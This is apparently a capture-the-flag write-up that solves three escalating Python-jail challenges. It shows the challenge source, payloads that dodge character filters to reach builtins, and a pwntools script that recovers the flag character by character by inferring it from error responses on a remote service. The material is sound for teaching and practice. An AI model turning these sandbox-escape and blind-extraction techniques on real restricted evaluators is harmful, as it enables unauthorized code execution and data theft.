# Censorship, Censorship Lite, and Censorship Lite++

Three pyjails of increasing difficulty. The first two I'm pretty sure I had an unintended for, though there are plenty of unintendeds for pyjails usually.


# Censorship
```python
from flag import flag

for _ in [flag]:
    while True:
        try:
            code = ascii(input("Give code: "))
            if "flag" in code or "e" in code or "t" in code or "\\" in code:
                raise ValueError("invalid input")
            exec(eval(code))
        except Exception as err:
            print(err)
```

Since the flag is already in the variable `_`, all we need to do is find a way to execute `print(_)`. The only issue is that we can't use the letter 't' in our code. We also can't use unicode look-alikes, since
everything is converted to ascii in the `ascii` function.

My line of thinking was to see if there was an alternate way of getting to the `print` function. The `print` function is part of the `__builtins__` module, so instead of calling `print` we can call `__builtins__.print`.

That's not very helpful though - instead of having 1 't' in our code, now we have 2. 

However, there's a very useful function we can use to fix our problem now: `vars()`. Calling `vars` on the `__builtins__` module gives us a dictionary of all the functions in `__builtins__`, including `print`. We can 
access the `__builtins__` module by calling `vars()` with no arguments, which returns another dictionary of all the current local variables, including `__builtins__`.

So now our payload looks like this:
`vars(vars()['__builtins__'])['print'](_)`.

We still have two 't's to deal with, but at least they're inside strings now. That means we can replace 't' with `chr(116)`. This gives us the final payload:

`vars(vars()['__buil'+chr(116)+'ins__'])['prin'+chr(116)](_)`.

Submitting this on remote gives us the flag: `amateursCTF{i_l0v3_overwr1t1nG_functions..:D}`. Considering no functions were overwritten, I'm pretty sure this was an unintended way to solve.

There were a lot of quicker ways to solve this pyjail, but this was the first thing I thought of, and it didn't take long to find.


# Censorship Lite
Despite being the "lite" version of the previous challenge, this pyjail added more restrictions.

```python
for _ in [flag]:
    while True:
        try:
            code = ascii(input("Give code: "))
            if any([i in code for i in "\lite0123456789"]):
                raise ValueError("invalid input")
            exec(eval(code))
        except Exception as err:
            print(err)
```

We can use the same idea here, except we aren't allowed to use numbers, meaning replacing 't' with `chr(116)` doesn't work. We also need to replace the 'i's and 'l' in "builtins" and "print".

Calling `chr(116)` is probably the easiest way to get the string `t`, so let's see if we can find another way to get the number 116. In a somewhat circular manner, the first way I thought of was calling `ord('s')+1`.
`ord(s)` is fine, but the `+1` is still a problem. Luckily, we can use the [tadpole operator](https://devblogs.microsoft.com/oldnewthing/20150525-00/?p=45044), a little-known feature of C++ that's also in Python, to add 1 to the 
value. Repeat the same trick for the 'l's and 'i's and we get:

```
vars(vars()['__bu' + chr(-~ord('h'))+ chr(-~ord('k')) +chr(-~ord('s'))+ chr(-~ord('h'))+'ns__'])['pr'+chr(-~ord('h'))+'n'+chr(-~ord('s'))](_)
```

Submitting the payload on remote gives us:

`amateursCTF{sh0uld'v3_r3strict3D_p4r3nTh3ticaLs_1nst3aD}`

...which is exactly what the next challenge does.

# Censorship Lite++


```
#!/usr/local/bin/python
from flag import flag

for _ in [flag]:
    while True:
        try:
            code = ascii(input("Give code: "))
            if any([i in code for i in "lite0123456789 :< :( ): :{ }: :*\ ,-."]):
                print("invalid input")
                continue
            exec(eval(code))
        except Exception as err:
            print("zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz")
```

The hardest of the pyjails from this CTF. No numbers, no commas, not even a function call. We can't even use a tadpole operator! Our previous approach has no chance of working here. We'll need to start from scratch for this one.

## What information can we get?

There's no real way to print things with this challenge, as far as I'm aware. Without that, the only real piece of information we can extract from each query is whether our code errored or not. Still, that's
enough to extract the flag.

## How can we cause an error?
There's not much we have to work with here. No numbers, no parentheses, no curly braces. Luckily, square brackets are still permitted, and the eventual solution will make heavy use of this fact.

Brackets allow us to construct lists, and with lists we might be able to trigger an `IndexError`. Unfortunately, we don't have numbers, so indexing a list will be harder. For that, we'll need type coersion. You see, Python will
implicitly convert `True` to the value `1` and `False` to `0`, under the right circumstances. This means `[[]][False]` won't cause an error, but `[[]][True]` will cause one. We can use that for to get information about the flag!

Let's test this out quickly by seeing if the flag is indeed the flag:
```
Give code: [[]][_==_]
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
Give code: [[]][_!=_]
Give code:
```

We've done it. We've deduced the flag is the flag.

![FLAG IS FLAG](flag_is_flag.png)


## Piecing together the flag
How do we extract (more meaningful) information about the flag using the errors? Well, we can access the flag one character at a time using `_[number]` for some number. We can't directly use numbers though, so we'll have to resort
to type coersion again. We can use previously learned information about the flag (namely, that it's equal to itself) to write `1` as `_==_`. Then we can just do `1+1+1+1...` to get any number we want, right?

Almost.

If we expand out those 1s, we get `_==_+_==_+...`. And `+` has higher precedence than `==`, so the expression won't evaluate the way we want to. And we can't use parentheses to fix the ordering.

We can solve this issue with more lists. Specifically, `[_==_][_!=_]` is the same as `[True][False]` which is the same as `True`, but now since everything is wrapped in brackets we can compose it with `+` without worrying about
precedence.

With this, we can now index into the flag with `_[[_==_][_!=_]+[_==_][_!=_]+[_==_][_!=_]+...]` to get any character of the flag. From there, we can compare it with any character except the censored ones. By using the comparison
as the index for a list of length 1, we will get an error only if the comparison is `True`.

Let's put this idea into code:

```python
from pwn import *

io = remote('amt.rs', 31672)

true_expr = '[_==_][_!=_]'
true_expr_plus = true_expr + '+'

for n in range(150):
    for c in 'qwryuopasdfghjkzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_':
        payload = (f"[_][_[[{(true_expr+'+')*n}[_==_][_!=_]][_!=_]]=='{c}']")
        io.sendlineafter(b'Give code: ', payload.encode())
        nl = io.recv()
        io.unrecv(nl)
        if b'zzz' in nl:
            print(c,end='')
            break
    else:
        print(' ', end='')
```

(this code skips the first character of the flag, but we already know it's 'a' so we don't have to worry).

Let's run this code: 

```
ma  ursCTF   _     _      _
```

Yeah it looks like there's a lot of missing characters. I stopped the code before it completed the loop, so that's not even the full flag. We need a way to compare with the missing characters as well, 
especially 'l','i','t', and 'e'. We know the index of 't' and 'e' from the flag format, so we can index into the flag to grab those chars.

Now our code looks like this:

```python
from pwn import *

io = remote('amt.rs', 31672)

true_expr = '[_==_][_!=_]'
true_expr_plus = true_expr + '+'


for n in range(150):
    for c in 'qwryuopasdfghjkzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_':
        payload = (f"[_][_[[{(true_expr+'+')*n}[_==_][_!=_]][_!=_]]=='{c}']")
        io.sendlineafter(b'Give code: ', payload.encode())
        nl = io.recv()
        io.unrecv(nl)
        if b'zzz' in nl:
            print(c,end='')
            break
    else:
        payload = (f"[_][_[[{(true_expr+'+')*n}[_==_][_!=_]][_!=_]]==_[{true_expr_plus*2+true_expr}]]")
        io.sendlineafter(b'Give code: ', payload.encode())
        nl = io.recv()
        io.unrecv(nl)
        if b'zzz' in nl:
            print('t',end='')
            continue

        payload = (f"[_][_[[{(true_expr+'+')*n}[_==_][_!=_]][_!=_]]==_[{true_expr_plus*3+true_expr}]]")
        io.sendlineafter(b'Give code: ', payload.encode())
        nl = io.recv()
        io.unrecv(nl)
        if b'zzz' in nl:
            print('e',end='')
            continue
        
        print(' ', end='')

```

Now let's look at the flag and see if we can determine the index of an 'l' and 'i':
```
mateursCTF{ e_e  te_  tt e_t
```

(again this is just the partial flag). It looks like the flag starts as "le_elite", so let's code in the corresponding indices for 'l' and 'i'.

```python
from pwn import *

io = remote('amt.rs', 31672)

true_expr = '[_==_][_!=_]'
true_expr_plus = true_expr + '+'


for n in range(150):
    for c in 'qwryuopasdfghjkzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_':
        payload = (f"[_][_[[{(true_expr+'+')*n}[_==_][_!=_]][_!=_]]=='{c}']")
        io.sendlineafter(b'Give code: ', payload.encode())
        nl = io.recv()
        io.unrecv(nl)
        if b'zzz' in nl:
            print(c,end='')
            break
    else:
        payload = (f"[_][_[[{(true_expr+'+')*n}[_==_][_!=_]][_!=_]]==_[{true_expr_plus*2+true_expr}]]")
        io.sendlineafter(b'Give code: ', payload.encode())
        nl = io.recv()
        io.unrecv(nl)
        if b'zzz' in nl:
            print('t',end='')
            continue

        payload = (f"[_][_[[{(true_expr+'+')*n}[_==_][_!=_]][_!=_]]==_[{true_expr_plus*3+true_expr}]]")
        io.sendlineafter(b'Give code: ', payload.encode())
        nl = io.recv()
        io.unrecv(nl)
        if b'zzz' in nl:
            print('e',end='')
            continue

        payload = (f"[_][_[[{(true_expr+'+')*n}[_==_][_!=_]][_!=_]]==_[{true_expr_plus*15+true_expr}]]")
        io.sendlineafter(b'Give code: ', payload.encode())
        nl = io.recv()
        io.unrecv(nl)
        if b'zzz' in nl:
            print('l',end='')
            continue

        payload = (f"[_][_[[{(true_expr+'+')*n}[_==_][_!=_]][_!=_]]==_[{true_expr_plus*16+true_expr}]]")
        io.sendlineafter(b'Give code: ', payload.encode())
        nl = io.recv()
        io.unrecv(nl)
        if b'zzz' in nl:
            print('i',end='')
            continue

        print(' ', end='')
```

Running the code for the full time gives us the output: `mateursCTF le_elite_little_tiles_let_le_light_light_le_flag_til_the_light_tiled_le_elitist_level `.

So the flag is `amateursCTF{le_elite_little_tiles_let_le_light_light_le_flag_til_the_light_tiled_le_elitist_level}`. Huzzah!
